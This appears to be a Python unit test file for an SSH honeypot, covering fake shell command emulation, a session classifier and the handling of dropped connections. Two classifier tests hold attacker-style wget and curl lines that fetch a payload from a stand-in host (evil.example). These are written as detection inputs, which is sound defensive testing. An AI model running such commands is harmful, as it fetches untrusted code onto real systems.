import contextlib
import os
import sys
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.chdir(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import honeypot
from fake_filesystem import FAKE_FS, FILE_CONTENTS
from profiles import classify


class FakeServer:
    def __init__(self, cwd="/"):
        self.cwd = cwd
        self.commands = []


class EmulateCommandTests(unittest.TestCase):

    def test_whoami_returns_root(self):
        self.assertEqual(honeypot.emulate_command("whoami", FakeServer()), "root")

    def test_cat_returns_the_real_file_contents(self):
        path = next(iter(FILE_CONTENTS))
        result = honeypot.emulate_command(f"cat {path}", FakeServer())
        self.assertEqual(result, FILE_CONTENTS[path])

    def test_cat_on_a_missing_file_says_permission_denied_not_a_crash(self):
        result = honeypot.emulate_command("cat /nonexistent/file", FakeServer())
        self.assertEqual(result, "Permission denied")

    def test_cat_with_no_argument_reports_a_missing_operand(self):
        result = honeypot.emulate_command("cat", FakeServer())
        self.assertEqual(result, "cat: missing file operand")

    def test_pwd_reports_the_server_cwd(self):
        server = FakeServer(cwd="/home/admin")
        self.assertEqual(honeypot.emulate_command("pwd", server), "/home/admin")

    def test_cd_into_a_real_directory_updates_cwd(self):
        target = next(d for d in FAKE_FS if d != "/")
        server = FakeServer(cwd="/")
        honeypot.emulate_command(f"cd {target}", server)
        self.assertEqual(server.cwd, target)

    def test_cd_into_a_fake_directory_reports_no_such_directory(self):
        server = FakeServer(cwd="/")
        result = honeypot.emulate_command("cd /nonexistent-dir", server)
        self.assertIn("No such file or directory", result)

    def test_an_unknown_command_says_command_not_found(self):
        self.assertEqual(honeypot.emulate_command("frobnicate", FakeServer()), "command not found")

    def test_empty_input_returns_empty_string(self):
        self.assertEqual(honeypot.emulate_command("", FakeServer()), "")


class ClassifyTests(unittest.TestCase):

    def test_a_wget_command_with_arguments_is_payload_delivery(self):
        self.assertEqual(classify(["wget http://evil.example/payload -O out"]), "payload_delivery")

    def test_a_curl_command_with_arguments_is_payload_delivery(self):
        self.assertEqual(classify(["curl -o out http://evil.example/payload"]), "payload_delivery")

    def test_whoami_alone_is_reconnaissance(self):
        self.assertEqual(classify(["whoami"]), "reconnaissance")

    def test_over_ten_commands_is_bruteforce_or_automation(self):
        self.assertEqual(classify(["ls"] * 11), "bruteforce_or_automation")

    def test_an_ordinary_short_session_is_unknown(self):
        self.assertEqual(classify(["ls", "pwd"]), "unknown")


class FakeChannel:
    # Minimal stand-in for a Paramiko channel so the session loop can be driven
    def __init__(self, recv_error=None, send_error=None, data=None):
        self.recv_error = recv_error
        self.send_error = send_error
        self.data = list(data or [])

    def settimeout(self, value):
        pass

    def recv(self, size):
        if self.recv_error is not None:
            raise self.recv_error
        if self.data:
            return self.data.pop(0)
        return b""

    def send(self, payload):
        if self.send_error is not None:
            raise self.send_error

    def close(self):
        pass


class FakeTransport:
    # Hands back a canned channel and skips the real SSH negotiation
    channel = None

    def __init__(self, client):
        pass

    def add_server_key(self, key):
        pass

    def start_server(self, server=None):
        pass

    def accept(self, timeout=None):
        return self.channel

    def close(self):
        pass


class FakeEvent:
    # Never blocks, so a test does not sit on the real ten second wait
    def wait(self, timeout=None):
        return True

    def set(self):
        pass


class FakeHoneypotSSH:
    def __init__(self, addr):
        self.addr = addr
        self.commands = []
        self.username = "attacker"
        self.password = "hunter2"
        self.cwd = "/"
        self.event = FakeEvent()


class ConnectionErrorHandlingTests(unittest.TestCase):

    def run_session(self, channel, emulate_side_effect=None):
        FakeTransport.channel = channel
        captured = {}
        patches = [
            mock.patch.object(honeypot.paramiko, "Transport", FakeTransport),
            mock.patch.object(honeypot, "HoneypotSSH", FakeHoneypotSSH),
            mock.patch.object(honeypot, "log_event", lambda data: captured.update(data)),
        ]
        if emulate_side_effect is not None:
            patches.append(mock.patch.object(honeypot, "emulate_command", side_effect=emulate_side_effect))
        with contextlib.ExitStack() as stack:
            for patcher in patches:
                stack.enter_context(patcher)
            honeypot.handle_connection(object(), ("203.0.113.9", 51515))
        return captured

    def test_a_client_that_drops_mid_command_is_logged_with_its_reason(self):
        event = self.run_session(FakeChannel(recv_error=OSError("connection reset by peer")))
        self.assertEqual(event["source_ip"], "203.0.113.9")
        self.assertIn("connection_lost", event["close_reason"])

    def test_a_client_that_drops_before_the_banner_is_still_logged(self):
        event = self.run_session(FakeChannel(send_error=OSError("broken pipe")))
        self.assertIn("banner_failed", event["close_reason"])

    def test_an_emulation_bug_records_the_session_instead_of_dropping_it(self):
        channel = FakeChannel(data=[b"whoami\n"])
        event = self.run_session(channel, emulate_side_effect=RuntimeError("boom"))
        self.assertEqual(event["commands"], ["whoami"])
        self.assertIn("internal_error", event["close_reason"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
